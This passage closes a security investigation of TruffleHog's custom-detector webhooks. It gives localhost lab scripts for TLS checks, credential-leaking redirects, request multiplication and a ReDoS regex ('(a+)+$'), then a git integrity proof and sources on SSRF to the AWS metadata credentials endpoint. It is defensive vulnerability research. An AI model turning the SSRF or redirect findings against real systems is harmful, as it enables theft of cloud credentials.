detectors: [ { name: TlsDetector, keywords: [labtok], regex: { theToken: 'labtok_[a-z0-9]{6}' },
  verify: [ { endpoint: 'https://127.0.0.1:'$P'/verify', unsafe: false } ] } ]
YAML
printf 'labtok_tls001\n' > targets/q2.txt
SSL_CERT_FILE=/tmp/lab/certs/ca.crt /tmp/lab/th filesystem --no-update --no-verification-cache \
  --json --config=cfg/q2.yaml targets/q2.txt
cat logs/q2.cnt   # {"app_layer":N,"handshake_errors":M,...}
# A: self-signed certs/ss.crt+ss.key           -> handshake_errors=1, app_layer=0 (unsafe:false AND true)
# C: wrong-SAN certs/wrong.crt+wrong.key        -> handshake_errors>=1, app_layer=0
# E: expired  certs/expired_fullchain.crt+.key  -> handshake_errors>=1, app_layer=0
# D: RESP_STATUS=307 RESP_LOCATION=http://127.0.0.1:$P2/p2 on the HTTPS mock; a second plaintext
#    mock on $P2 records whether method/body/Authorization survive the hop (301/302/303 vs 307/308)
# F: HTTP_PROXY=http://127.0.0.1:$PROXY /tmp/lab/th ... (proxy mock logs absolute-form request path
#    and, for cross-origin 307, that Authorization is stripped while Proxy-Authorization persists)

# Q3 - multiplicity: N matches -> N requests per span; capped per span at 100 (cache OFF)
start_http 127.0.0.1 $P logs/q3.log logs/q3.ready >/dev/null
cat > cfg/q3.yaml <<YAML
detectors: [ { name: SpanDet, keywords: [labtok], regex: { theToken: 'labtok_[a-z0-9]+' },
  verify: [ { endpoint: 'http://127.0.0.1:'$P'/v', unsafe: true } ] } ]
YAML
python3 -c "open('targets/q3.txt','w').write(' '.join('labtok_%06d'%i for i in range(50)))"
/tmp/lab/th filesystem --no-update --scan-entire-chunk --no-verification-cache \
  --config=cfg/q3.yaml targets/q3.txt
wc -l < logs/q3.log      # request count == number of matches

# Q4.g - response-body edge cases (drive RESP_* / mock_partial.py; read outcome with parse_q4.py)
cat > cfg/q4.yaml <<YAML
detectors: [ { name: BodyDet, keywords: [labtok], regex: { theToken: 'labtok_[a-z0-9]{6}' },
  verify: [ { endpoint: 'http://127.0.0.1:'$P'/v', unsafe: true } ] } ]
YAML
printf 'labtok_eee555\n' > targets/q4.txt
RESP_STATUS=200 RESP_BODYLEN=0    start_http 127.0.0.1 $P logs/q4.log logs/q4.ready >/dev/null   # empty
RESP_STATUS=200 RESP_BODYLEN=5000 start_http 127.0.0.1 $P logs/q4.log logs/q4.ready >/dev/null   # oversized -> [:200]
python3 /tmp/lab/mock_partial.py 127.0.0.1 $P logs/q4p.log logs/q4p.ready &                       # partial -> verified, no readback
RESP_DELAY=6 start_http 127.0.0.1 $P logs/q4.log logs/q4.ready >/dev/null                         # slow > 5s client -> unverified
/tmp/lab/th filesystem --no-update --no-verification-cache --json --config=cfg/q4.yaml targets/q4.txt > logs/q4.json
python3 /tmp/lab/parse_q4.py BodyDet logs/q4.json

# Q5 - ReDoS: evil vs benign timing stays FLAT (RE2 linear); backreference rejected at load
cat > cfg/q5_evil.yaml   <<YAML
detectors: [ { name: Evil,   keywords: [a], regex: { r: '(a+)+$' } } ]
YAML
cat > cfg/q5_benign.yaml <<YAML
detectors: [ { name: Benign, keywords: [a], regex: { r: 'zzzzzzzz' } } ]
YAML
for N in 1000 2000 4000 8000; do
  python3 -c "open('targets/a_$N.txt','w').write('a'*$N + 'X\n')"
  for cfg in q5_evil q5_benign; do
    /usr/bin/time -f "$cfg $N %e s" /tmp/lab/th filesystem --no-update --no-verification \
      --scan-entire-chunk --config=cfg/$cfg.yaml targets/a_$N.txt >/dev/null
  done
done
# backreference: a config regex '(a)\1' -> exit 1 "error parsing regexp: invalid escape sequence: `\1`"
# EXTERNAL contrast (NOT trufflehog - stdlib Python's backtracking engine, for scale only):
#   python3 -c "import re,time; n=24; t=time.time(); re.search('(a+)+\$','a'*n+'!'); print(time.time()-t)"
#   n=20 -> ~0.10s, n=24 -> ~1.52s, n>=28 -> aborted >10s (each +4 ~= x10)
```

> All quantitative results (request counts, timings, handshake outcomes) were reproduced across **>= 2 runs**. After the investigation the entire `/tmp/lab` tree was deleted and the IPv6-on-`lo` sysctl reverted (`net.ipv6.conf.{lo,all}.disable_ipv6=1`); the repository checkout was never written to.

**Repository-integrity proof.** The source tree is left byte-for-byte unchanged; the only file this task adds is this document. Rather than embed a volatile working-HEAD short hash — which advances every time this document is committed and therefore cannot be reproduced afterward — the checks below are **durable**: they hold on any committed revision that contains this document, because the only path that ever differs from the frozen baseline `e42153d44a5e` is the deliverable itself.

```
$ git -C <checkout> status --porcelain
# (no output) → working tree clean; no source file created, edited, or deleted
$ git -C <checkout> diff e42153d44a5e --name-status
A	blitzy/documentation/trufflehog_e42153d44a5e.md
$ git -C <checkout> merge-base --is-ancestor e42153d44a5e HEAD && echo "e42153d44a5e is an ancestor of HEAD"
e42153d44a5e is an ancestor of HEAD
```

The frozen baseline `e42153d44a5e` is a permanent ancestor of every revision on this branch, so the single-path `diff … --name-status` and the empty `status --porcelain` above reproduce on any committed revision of the document; only the working-HEAD short hash advances with each commit, making it an investigation-time snapshot rather than a fixed reproducible value. The only file added by this task is this document, `blitzy/documentation/trufflehog_e42153d44a5e.md`.

---

## External references

These external sources were used to benchmark the **observed** behavior against documented expectations; they are not a substitute for the runtime evidence above.

- **Go `regexp` linear-time / RE2.** Go's package documentation states the implementation "is guaranteed to run in time linear in the size of the input" and that its syntax "is the syntax accepted by RE2" — `https://pkg.go.dev/regexp`. The RE2 project confirms the relationship this document relies on: "The Go regexp package and Rust regex crate do not share code with RE2, but they follow the same principles, accept the same syntax, and provide the same efficiency guarantees," and that constructs requiring backtracking — "backreferences … and generalized assertions" — are excluded — `https://github.com/google/re2/wiki/Syntax` and the RE2 project README. (Supports Q5: Go stdlib `regexp` is RE2-*syntax*, linear-time, and not a separately linked C++ library.)
- **Go `net/http` redirect behavior.** The `net/http` docs and `client.go` state that "a 301, 302, or 303 redirect causes subsequent requests to use HTTP method GET … with no body," while "a 307 or 308 redirect preserves the original HTTP method and body," and that sensitive headers such as `Authorization` "are retained on redirect to a subdomain or to a different scheme on the same host" (stripped cross-domain) — `https://pkg.go.dev/net/http` and `https://go.dev/src/net/http/client.go`. (Supports Q2 Condition D: same-host `307/308` `HTTPS→HTTP` re-sends the body and `Authorization` over cleartext.)
- **AWS EC2 Instance Metadata Service.** IMDSv1 is a bare request/response `GET`; IMDSv2 requires a `PUT` to `http://169.254.169.254/latest/api/token` (with `X-aws-ec2-metadata-token-ttl-seconds`) to obtain a token that must accompany subsequent `GET`s, and IAM credentials live under `/latest/meta-data/iam/security-credentials/<role>` — `https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html` and `.../instance-metadata-security-credentials.html`. (Supports Q1: a fixed `POST` cannot complete the IMDSv2 token exchange, so credential theft is not turnkey against IMDSv2; the SSRF *dispatch* and 200-byte readback remain real.)
- **SSRF prevention.** OWASP's guidance is to prefer an allowlist ("Deny-lists are bypass-prone. Prefer allow-lists"), to block internal/reserved and cloud-metadata ranges, to resolve the hostname to its final IP before validation, and to disable redirect-following to prevent validation bypass — OWASP SSRF Prevention Cheat Sheet (`https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html`) and OWASP Top 10 A10:2021 (`https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_(SSRF)/`). (Frames Q1/Q6: TruffleHog's custom-detector webhook path implements none of these destination checks.)
